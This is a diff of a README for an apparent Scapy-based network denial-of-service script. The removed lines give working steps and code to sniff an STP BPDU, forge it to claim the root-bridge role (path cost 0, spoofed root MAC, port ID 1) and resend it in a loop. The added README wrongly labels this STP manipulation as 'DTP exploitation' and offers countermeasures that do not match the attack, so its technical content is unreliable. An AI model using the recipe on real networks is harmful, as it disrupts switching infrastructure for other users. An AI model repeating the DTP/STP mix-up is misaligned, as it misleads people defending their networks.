@@ -1,39 +1,51 @@
--> DOS STP-Network Attack :
+# Network DOS Attack with DTP Exploitation
 
-  - Capturing STP packets phase :
-  .1. Capture packets from the network using "scapy.sniff(filter="CaptureFilter",count="Packet.No")" .
+Author: Abdelrahman Adel
+Date: 2022
 
-   .1.1 Capturing idea is for get the STP-Packet information (Bridge-Port, Port-Cost, Port-ID, Fake BPDU) .
+## Overview
 
-   - sniffed_pkt = sniff(filter="ether dst 01:80:c2:00:00:00",count=1,iface="Interface", prn="Function",store=False | True)
-    - 01:80:c2:00:00:00 Is the STP (spanning tree protocol) Default Multicast-MAC
-Address .
+This README provides an overview of a Python script that performs a Network Denial of Service (DOS) attack by exploiting the Dynamic Trunking Protocol (DTP) feature on Cisco switches. DTP is a network protocol used for negotiating trunking on Ethernet links. This script demonstrates how an attacker can disrupt network operations by manipulating STP packets.
 
+## DTP Exploitation
 
+The Dynamic Trunking Protocol (DTP) is a Cisco proprietary protocol used for the negotiation of trunking on a network link. This script exploits DTP by changing the path cost of the root bridge, the bridge's MAC address, and the port ID in Spanning Tree Protocol (STP) packets. The attacker sends these manipulated packets to disrupt network operations.
 
-  - Show Packet Information Phase :
-  .2. sniffed_pkt[0] : View captured frame, Keep in mind that I captured one packet up .
-  .3. sniffed_pkt[0].show() : View captured frame - show nicely .
-  .4. sniffed_pkt[0][0].show() : View 802.3 Ethernet .
-  .5. sniffed_pkt[0][1].show() : View Logical-Link Control .
-  .6. sniffed_pkt[0][2].show() : View STP .
-  .6.2 sniffed_pkt[0][STP].show() : Specify STP
+## Usage
 
-  - Start Block (DOS) And Setting Changing attack :
-  .1. sniffed_pkt[0].pathcost = 0  : Because the root cost for the root-bridge from the
-root bridge = 0, which mean i modified the packet to have the cost = 0 as I am a
-root-bridge .
-   .1.1 Block port to root switch .
-   .1.2 Set cost to root to zero .
-  .2. sniffed_pkt[0].bridgemac = sniffed_pkt[0].rootmac : Set bridge MAC to root bridge .
-  .3. sniffed_pkt[0].portid = 1 : Set port id to 1, to break the tie if it happend by
-have the lowest port-id = 1, to let other devices ensure that i am the root-bridge .
-  .4. for i in range(0, 50):  Loop to send multiple BPDUs .
-        sniffed_pkt[0].show()
-        sendp(sniffed_pkt[0],loop=0,verbose=1)
-        time.sleep(1)
+To use the Network DOS Attack with DTP Exploitation script, follow these steps:
+
+1. Review the script and understand its purpose and potential impact.
+
+2. Ensure you have the required Python packages installed. You can install them using pip:
+
+pip install scapy OR python3 -m pip install scapy
 
 
-  - This attack to change the route of the topology and change the path for the root switch, and set my path as root-switch path .
-  - Faking the switch that I changed the path between it and the root switch, that the best way or "the root path is through" my device rather than the original root path, and can do that by manipulating the original pathcost and change it to zero then change the mac address of the root path .
- 
+3. Customize the script to target your specific network or test environment.
+
+4. Run the script with caution and in a controlled and authorized environment. It is essential to have proper authorization and ethical reasons for running this script.
+
+5. Monitor the network during the script's execution to understand its impact.
+
+## Safeguards and Countermeasures
+
+It is crucial to safeguard your network against such attacks. Some safeguards and countermeasures include:
+
+1. **Disable DTP**: Disable DTP on all Cisco switch interfaces that do not require trunking. This will prevent the negotiation of trunking and reduce the attack surface.
+
+2. **VLAN Access Control**: Implement VLAN access control to ensure that only authorized devices are allowed on specific VLANs. This can help mitigate unauthorized network disruptions.
+
+3. **Network Monitoring**: Use network monitoring tools to detect and respond to abnormal network behavior and unexpected changes in STP packets.
+
+4. **Intrusion Detection Systems (IDS)**: Deploy IDS to monitor and detect suspicious network activity, including unusual changes to STP packets.
+
+## License
+
+This documentation is provided under the MIT license, allowing you to use and modify it freely. However, ensure that you follow ethical guidelines and relevant laws when securing your network.
+
+## Note
+
+Please use these safeguards and countermeasures responsibly. Unauthorized or malicious use of network attack techniques can have legal and ethical consequences. Network security is vital for maintaining a reliable and secure network environment.
+
+By understanding and implementing safeguards, you can protect your network from DTP exploitation and other network security risks.
